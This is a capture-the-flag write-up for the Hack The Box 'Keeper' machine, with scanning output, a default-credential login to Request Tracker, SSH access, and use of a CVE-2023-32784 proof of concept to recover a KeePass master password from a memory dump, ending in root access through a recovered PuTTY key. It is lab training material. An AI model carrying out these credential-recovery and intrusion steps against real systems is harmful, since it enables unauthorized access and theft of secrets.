---
title: HTB - Keeper
date: 2023-11-21
categories: [CTF Write Up, HTB]
tags: [nmap, whatweb, wappalyzer, curl, request-tracker, default-credentials, ssh, netstat, keepass, cve-2023-32784, dmp, kdbx, putty, ppk, puttygen, pem]
img_path: /assets/keeper/
published: true
---

![room_banner](keeper_banner.png)

## Overview

|:-:|:-:|
|Machine|[Keeper](https://app.hackthebox.com/machines/556)
|Rank|Easy|
|Time|3h19m|
|Focus|Default credentials, [CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784)

## Information Gathering

```shell
# live host discovery
sudo nmap -PA -sn 10.10.11.227
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-21 16:26 GMT
Nmap scan report for 10.10.11.227
Host is up (0.024s latency).
Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```

```shell
# scanning common ports
sudo nmap -sS -sC -sV -O -Pn --min-rate 10000 10.10.11.227
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-21 16:29 GMT
Nmap scan report for 10.10.11.227
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/21%OT=22%CT=1%CU=32880%PV=Y%DS=2%DC=I%G=Y%TM=655
OS:CDAF8%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=FC%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST
OS:11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=F
OS:E88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M
OS:53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.75 seconds
```

## Web Server Enumeration

```shell
whatweb http://10.10.11.227
http://10.10.11.227 [200 OK] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.227], nginx[1.18.0]
```

```shell
curl http://10.10.11.227
<html>
  <body>
    <a href="http://tickets.keeper.htb/rt/">To raise an IT support ticket, please visit tickets.keeper.htb/rt/</a>
  </body>
</html>
```

<figure>
    <img src="hosts_file.png"
    alt="/etc/hosts file" >
</figure>

<figure>
    <img src="wappalyzer.png"
    alt="Wappalyzer report" >
</figure>

```shell
# banner grabbing
curl -IL http://$IP/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 21 Nov 2023 16:42:35 GMT
Content-Type: text/html
Content-Length: 149
Last-Modified: Wed, 24 May 2023 14:04:44 GMT
Connection: keep-alive
ETag: "646e197c-95"
Accept-Ranges: bytes
```

<figure>
    <img src="tickets_home.png"
    alt="Tickets.keeper.htb homepage - Login form" >
</figure>

> RT 4.4.4 (out-of-date), latest 5.0.5, [release notes](https://docs.bestpractical.com/release-notes/rt/5.0.5) include 3 CVEs. Proved a rabbit hole!

<figure>
    <img src="default_creds_google.png"
    alt="Googling default credentials for Request tracker" >
</figure>

<figure>
    <img src="rt_logged_in.png"
    alt="Logged in with default credentials" >
</figure>

<figure>
    <img src="user_details.png"
    alt="Enumeration users on the website" >
</figure>

## Initial Foothold

```shell
ssh lnorgaard@$IP
The authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.
lnorgaard@10.10.11.227's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
```

```shell
lnorgaard@keeper:~$ netstat -ltn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        7      0 127.0.0.1:9000          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp6       0      0 ::1:25                  :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
```

```shell
lnorgaard@keeper:~$ netstat -lt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        8      0 localhost:9000          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN
tcp6       0      0 localhost:smtp          [::]:*                  LISTEN
tcp6       0      0 [::]:http               [::]:*                  LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
```

```shell
lnorgaard@keeper:~$ ls -l
total 332820
-rwxr-x--- 1 lnorgaard lnorgaard 253395188 May 24 12:51 KeePassDumpFull.dmp
-rwxr-x--- 1 lnorgaard lnorgaard      3630 May 24 12:51 passcodes.kdbx
-rw-r--r-- 1 root      root       87391651 Nov 21 19:18 RT30000.zip
-rw-r----- 1 root      lnorgaard        33 Nov 21 17:22 user.txt
```

> The **DMP file** is primarily associated with the MemoryDump or Minidump file format. It is used in Microsoft Windows operating system to **store data that has been dumped from the memory space of the computer**. Usually, DMP files are created when a file crashes or an error occurs.

> A **KDBX file** is a **password database** created by _KeePass Password Safe_, a free password manager for Windows. It stores an encrypted database of passwords that **can be viewed only using a master password** set by the user. KDBX files are used to securely store personal login credentials for Windows, email accounts, FTP sites, e-commerce sites, and other purposes.

<figure>
    <img src="nvd-cve.png"
    alt="CVE-2023-32784 description" >
</figure>

> [CVE-2023-32784 PoC](https://github.com/z-jxy/keepass_dump): transfer `KeePassDumpFull.dmp` & `passcodes.kdbx` locally by opening a python3 http.server on the target and using `wget` from my machine.

```shell
python3 keepass_dump.py -f ~/htb/keeper/KeePassDumpFull.dmp
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:  {UNKNOWN}
[*] 2:  d
[*] 3:  g
[*] 4:  r
[*] 6:  d
[*] 7:
[*] 8:  m
[*] 9:  e
[*] 10: d
[*] 11:
[*] 12: f
[*] 13: l
[*] 15: d
[*] 16: e
[*] Extracted: {UNKNOWN}dgrd med flde
```

<figure>
    <img src="danish_google.png"
    alt="Searching danish-related words on Google" >
</figure>

```shell
sudo apt install keepass2
keepass2
```
<figure>
    <img src="keepass2.png"
    alt="Keepass2 application" >
</figure>

<figure>
    <img src="keepass2_1.png"
    alt="Opening file with the Keepass2 application" >
</figure>

> PuTTY's default format is `.ppk`: copy the contents on the note and copy it to a new file with `.ppk` file extension locally. Then, create a .pem key file using `puttygen`.

> [SSH's man page](https://linux.die.net/man/1/ssh): ssh will simply ignore a private key file if it is accessible by others.

```shell
puttygen key.ppk -O private-openssh -o key.pem
chmod 400 key.pem
ls -l
total 247476
-rw-r--r-- 1 kali kali 253395188 May 24 11:51 KeePassDumpFull.dmp
-r-------- 1 kali kali      1675 Nov 21 19:46 key.pem
-rw-r--r-- 1 root root      1459 Nov 21 19:44 key.ppk
-rw-r--r-- 1 kali kali      3630 May 24 11:51 passcodes.kdbx
```

> [PEM files and SSH](https://www.howtogeek.com/devops/what-is-a-pem-file-and-how-do-you-use-it/): PEM files are also used for SSH. Your `~/.ssh/id_rsa` is a PEM file, just without the extension. You'll have to use the `-i` flag with ssh to specify that you want to use this new key instead of id_rsa.

## Privilege Escalation

```shell
ssh -i key.pem root@10.10.11.227
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# ls
root.txt  RT30000.zip  SQL
```

<figure>
    <img src="keeper_pwned.png"
    alt="Keeper machine pwned" >
</figure>

